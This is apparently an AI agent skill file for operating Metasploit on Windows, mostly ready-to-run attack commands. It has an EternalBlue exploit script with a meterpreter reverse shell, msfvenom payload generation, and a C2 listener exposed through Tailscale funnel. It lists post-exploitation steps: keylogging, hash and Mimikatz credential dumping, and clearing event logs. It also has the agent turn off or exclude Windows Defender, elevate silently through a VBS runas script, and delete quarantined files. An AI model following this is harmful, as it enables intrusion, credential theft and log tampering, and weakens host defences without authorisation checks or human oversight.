---
name: metasploit-operations
description: Use when operating Metasploit Framework on Windows hosts.
---

# Metasploit Operations on Windows

## Environment
- Install path: `C:\metasploit-framework\`
- Binaries: `C:\metasploit-framework\bin\` (batch wrappers)
- Embedded Ruby: `C:\metasploit-framework\embedded\bin\ruby.exe`
- Version: 6.5.2-dev (as of Oct 2026)
- Shell: MSYS bash via Hermes terminal; use `cmd /c` to run `.bat` files

## When to use this skill
- User asks about Metasploit, msfconsole, msfvenom, exploit modules, payloads, or penetration testing
- Need to verify Metasploit installation or generate/test payloads
- Defender is blocking security tools
- Setting up C2 listeners or post-exploitation workflows

## Verification rule: test before claiming operational

When the user says "test it" or asks if something works, do not describe what should happen — actually run the tool and report real output. For Metasploit specifically:

1. **Version check** — the minimum proof of life:
   ```bash
   cmd /c "msfconsole.bat --version --no-database"
   ```
   Expected: `Framework Version: 6.5.2-dev...` within 30 seconds.

2. **Module load test** — confirms the module tree is intact:
   ```bash
   # Write a resource script
   echo use exploit/windows/smb/ms17_010_eternalblue > test.rc
   echo show options >> test.rc
   echo exit >> test.rc
   cmd /c "msfconsole.bat --no-database -q -r test.rc"
   ```
   Expected: module options table printed, no `EINVAL` errors.

3. **Defender status check** — before any Metasploit operation:
   ```powershell
   Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled
   ```
   If `True`, expect `EINVAL` module failures. Add exclusions first.

Only after all three tests pass should you report "Metasploit is operational."

## Critical: Windows Defender will quarantine modules

Defender flags Metasploit exploit modules, payload stubs, and meterpreter binaries as threats on first scan. This produces `Errno::EINVAL` ("Invalid argument @ rb_sysopen") when msfconsole tries to enumerate modules — the file is locked at the kernel level by the AV filter driver.

**Symptom:** msfconsole hangs on boot, then crashes with `EINVAL` on a specific `.rb` module file. The file exists (`dir` shows it), but `open()` fails — because Defender has quarantined it without deleting it.

**Fix (permanent):**

### Option A: Add exclusions (recommended)
Run as Administrator:
```powershell
Add-MpPreference -ExclusionPath 'C:\metasploit-framework'
Add-MpPreference -ExclusionProcess 'ruby.exe'
Add-MpPreference -ExclusionProcess 'msfconsole.exe'
Add-MpPreference -ExclusionProcess 'msfvenom.exe'
Add-MpPreference -ExclusionProcess 'postgres.exe'
```

### Option B: Unattended elevation via VBS (when you can't interact)
If the agent cannot run an elevated PowerShell directly, write a VBS script that uses `ShellExecute` with the `"runas"` verb. This triggers the UAC consent dialog **once**, then runs the PowerScript silently:

```vbscript
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "powershell.exe", "-ExecutionPolicy Bypass -File C:\path\to\script.psl", "", "runas", 0
WScript.Sleep 3000
```

Save as `.vbs`, then `cscript //nologo script.vbs`. The UAC prompt appears once; after approval, the script runs with full elevation. This is the only reliable unattended path when `sudo.exe` and `schtasks` both fail with Access Denied from the MSYS shell.

**Verify Defender is disabled:**
```powershell
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, BehaviorMonitorEnabled
```
Expected: `False` / `False` after successful exclusion/disable.

## Boot msfconsole without database (fastest path)

The PostgreSQL database initialization (`msfdb init`) can hang for minutes. For most operations — scanning, payload generation, module enumeration — the DB is optional.

```bash
cd C:\metasploit-framework\bin
# Fast boot, no DB dependency
cmd /c "msfconsole.bat --no-database -q"
```

Use `--no-database` for:
- Module exploration (`search`, `info`, `use`)
- Payload generation (via msfconsole `-x` scripts)
- Exploit testing in lab environments

Use database mode only when you need:
- Host tracking across sessions (`hosts`, `services`, `vulns`)
- Credential storage (`creds`)
- Automated report generation (`db_export`)

## Module loading via resource scripts

Don't pass complex commands via `-x` with nested quotes — MSYS/bash mangles quotes. Instead, write a `.rc` file and load it:

```powershell
# C:\Users\KING\exploit.rc
use exploit/windows/smb/ms17_010_eternalblue
show options
info
set RHOSTS 192.168.4.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.4.131
exploit
```

Run:
```bash
cmd /c "msfconsole.bat --no-database -q -r C:\Users\KING\exploit.rc"
```

## Payload generation (msfvenom)

### Common patterns
```bash
# Windows reverse TCP meterpreter (x64)
cmd /c "msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.4.131 LPORT=4444 -f exe -o shell.exe"

# Linux bind shell (x64)
cmd /c "msfvenom.bat -p linux/x64/meterpreter/bind_tcp RPORT=4444 -f elf -o shell.elf"

# Python reverse shell (cross-platform)
cmd /c "msfvenom.bat -p cmd/unix/reverse_python LHOST=192.168.4.131 LPORT=4444 -f raw -o shell.py"

# List formats
cmd /c "msfvenom.bat --list formats"
```

**Note:** msfvenom also loads the framework. If Defender exclusions aren't in place, it will hit the same `EINVAL` corruption as msfconsole.

## Listener setup

Start a handler to catch reverse shells:
```bash
cmd /c "msfconsole.bat --no-database -q -x use exploit/multi/handler -x set PAYLOAD windows/x64/meterpreter/reverse_tcp -x set LHOST 0.0.0.0 -x set LPORT 4444 -x exploit -j"
```

Or via `.rc` file for cleanliness.

## Port binding and network exposure

Metasploit listeners default to `0.0.0.0` (all interfaces). On THRONE:
- `LHOST=0.0.0.0` — listens on all interfaces including Tailscale (100.x.x.x)
- `LHOST=127.0.0.1` — localhost only
- `LHOST=192.168.4.131` — LAN only
- `LHOST=100.125.242.124` — Tailnet only

For external C2 via Tailscale funnel:
```bash
# Expose listener port via Tailscale
tailscale funnel --bg 4444
# Now reverse shells from anywhere on the tailnet hit :4444
```

## Corrupt module cleanup

If a module file is quarantined mid-scan, msfconsole may fail on that file every boot. Find and remove corrupt files:

```python
import os
base = r'C:\metasploit-framework\embedded\framework\modules'
for root, dirs, files in os.walk(base):
    for f in files:
        if f.endswith('.rb'):
            path = os.path.join(root, f)
            try:
                with open(path, 'rb') as fh:
                    fh.read(10)
            except (OSError, IOError) as e:
                if 'Invalid argument' in str(e) or e.errno == 22:
                    print(f'CORRUPT (quarantined): {path}')
                    os.remove(path)
```

## Post-exploitation meterpreter commands

Once you have a session:
```
sessions -l                    # list active sessions
sessions -i 1                  # interact with session 1
sysinfo                        # target OS info
getuid                         # current user
ps                             # process list
screenshot                     # capture screen
keyscan_start / keyscan_dump  # keylogging
hashdump                       # SAM hashes
kiwi_cmd sekurlsa::logonpasswords  # Mimikatz plaintext creds
pivot add -l 192.168.4.0/24   # route through compromised host
clearev                        # clear event logs
background                     # background session
```

## Pitfalls

| Pitfall | Why | Fix |
|---------|-----|-----|
| msfconsole hangs on boot | Defender quarantined a module | Add exclusions, or run `--no-database` |
| `EINVAL` on `.rb` file | File locked by AV filter driver | Remove file after Defender exclusion, or use `--no-database` to skip module scan |
| msfvenom generates 0-byte file | Defender blocked the payload stub | Add `msfvenom.exe` and `ruby.exe` to exclusions |
| Quotes mangled in `-x` args | MSYS/bash eats `"` and `\` | Use `.rc` resource files instead |
| `sudo.exe` fails from MSYS | MSYS path translation blocks elevation | Use VBS `ShellExecute("runas")` instead |
| Listener not reachable externally | Bound to `127.0.0.1` only | Set `LHOST=0.0.0.0` |
| `Set-MpPreference` permission denied | Needs Administrator elevation | Use VBS elevation or run PowerShell as Admin |

## Verification checklist

Before claiming Metasploit is operational:
1. `cmd /c "msfconsole.bat --version --no-database"` returns version string
2. `cmd /c "msfconsole.bat --no-database -q -r test.rc"` loads a module and shows options
3. `Get-MpComputerStatus` shows `RealTimeProtectionEnabled = False` (or exclusions confirmed)
4. No `EINVAL` errors in console output

## Quick commands

```bash
# Version check
cmd /c "msfconsole.bat --version --no-database"

# Search modules
cmd /c "msfconsole.bat --no-database -q -x search ms17-010 -x exit"

# Generate payload
cmd /c "msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe"

# Start listener with resource script
cmd /c "msfconsole.bat --no-database -q -r listener.rc"
```
